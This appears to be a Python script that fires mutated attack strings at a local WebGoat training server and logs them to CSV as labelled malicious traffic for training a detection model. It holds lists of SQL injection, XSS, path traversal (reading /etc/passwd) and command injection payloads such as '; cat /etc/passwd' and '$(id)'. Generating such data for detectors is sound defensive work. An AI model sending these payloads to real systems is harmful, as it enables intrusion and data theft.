#!/usr/bin/env python3
"""
webgoat_synthetic_malicious.py
Generates unique, synthetic malicious web traffic for ML model training.
Focuses on pattern recognition (signatures) rather than functional exploitation.
"""
import requests
import time
import random
import csv
import os
import hashlib
from urllib.parse import urljoin
from faker import Faker
from tqdm import trange
from uuid import uuid4
from datetime import datetime

# ---------- CONFIG ----------
WEBGOAT_BASE_URL = "http://localhost:8080/WebGoat/"
NUM_REQUESTS = 10000
LOG_CSV = "webgoat_malicious_synthetic.csv"
VERBOSE = True
MIN_DELAY = 0.01
MAX_DELAY = 0.05
DEFAULT_TIMEOUT = 30

# ---------- ATTACK SIGNATURES ----------
# Common patterns used for training detection models
SQLI_PATTERNS = [
    "' OR '1'='1",
    "UNION SELECT NULL, NULL",
    "admin' --",
    "WAITFOR DELAY '0:0:5'",
    "1; DROP TABLE users",
    "' OR 1=1#",
]

XSS_PATTERNS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
]

TRAVERSAL_PATTERNS = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
]

CMD_INJECTION_PATTERNS = [
    "; cat /etc/passwd",
    "| dir",
    "&& whoami",
    "$(id)",
    "`ping 127.0.0.1`",
]

faker = Faker()

class WebGoatMaliciousGenerator:
    def __init__(self):
        self.base_url = WEBGOAT_BASE_URL
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Synthetic-Malicious-Gen/1.0"})
        self.used_signatures = set()
        self.csv_file = LOG_CSV
        self.csv_headers = [
            "_id", "signature", "body_bytes_sent", "ip", "request.method", "request.path",
            "request.protocol", "request_body", "status", "timestamp"
        ]
        self._initialize_csv()

    def _initialize_csv(self):
        # Create a fresh file for this run
        with open(self.csv_file, "w", newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=self.csv_headers)
            writer.writeheader()

    def _log_csv(self, log_data):
        with open(self.csv_file, "a", newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=self.csv_headers)
            writer.writerow(log_data)

    def _login(self):
        # Basic login to establish session
        login_url = urljoin(self.base_url, "login")
        try:
            data = {"username": "webgoat", "password": "webgoat"}
            self.session.post(login_url, data=data)
            return True
        except:
            return False

    def _generate_unique_payload(self, base_pattern):
        """
        Combines a base attack signature with random data to ensure uniqueness.
        This helps the ML model learn the signature regardless of the surrounding noise.
        """
        mutation_type = random.choice(["prefix", "suffix", "parameter", "comment"])
        unique_id = str(uuid4())[:8]
        
        if mutation_type == "prefix":
            return f"{unique_id} {base_pattern}"
        elif mutation_type == "suffix":
            return f"{base_pattern} "
        elif mutation_type == "parameter":
            return f"{base_pattern}&nonce={unique_id}"
        else:
            return f"{base_pattern} -- {unique_id}"

    def _send_request(self, endpoint, payload):
        url = urljoin(self.base_url, endpoint)
        
        # Calculate signature for uniqueness check
        sig_raw = f"POST {endpoint} {payload}"
        req_signature = hashlib.md5(sig_raw.encode()).hexdigest()
        
        if req_signature in self.used_signatures:
            return None
        self.used_signatures.add(req_signature)

        # Send the request (expecting errors, as these are malicious)
        try:
            start_time = datetime.now()
            # We force the payload into a parameter expected by the endpoint
            # usually 'name', 'account', 'search', etc.
            data = {"payload": payload} 
            
            # Note: We don't check for 200 OK here, as malicious requests often cause 500s or 403s
            resp = self.session.post(url, data=data, timeout=5)
            
            log_entry = {
                "_id": str(uuid4()),
                "signature": req_signature,
                "body_bytes_sent": len(resp.content),
                "ip": faker.ipv4(),
                "request.method": "POST",
                "request.path": endpoint,
                "request.protocol": "HTTP/1.1",
                "request_body": f"payload={payload}",
                "status": resp.status_code,
                "timestamp": start_time.isoformat()
            }
            self._log_csv(log_entry)
            return True
        except Exception:
            return False

    def generate(self):
        if not self._login():
            print("Login failed. Check server.")
            return

        # Targets within WebGoat that accept input
        targets = [
            "SqlInjection/attack8",
            "CrossSiteScripting/attack1",
            "service/restxml",
            "cia/command-injection"
        ]

        print(f"[*] Generating {NUM_REQUESTS} unique synthetic malicious requests...")
        
        count = 0
        with trange(NUM_REQUESTS) as pbar:
            while count < NUM_REQUESTS:
                # 1. Pick a random target
                target = random.choice(targets)
                
                # 2. Pick a random attack category and pattern
                category = random.choice([SQLI_PATTERNS, XSS_PATTERNS, TRAVERSAL_PATTERNS, CMD_INJECTION_PATTERNS])
                base_pattern = random.choice(category)
                
                # 3. Mutate to ensure uniqueness
                payload = self._generate_unique_payload(base_pattern)
                
                # 4. Send
                if self._send_request(target, payload):
                    count += 1
                    pbar.update(1)
                
                time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

if __name__ == "__main__":
    gen = WebGoatMaliciousGenerator()
    gen.generate()
    print(f"[*] Finished. Data saved to {LOG_CSV}")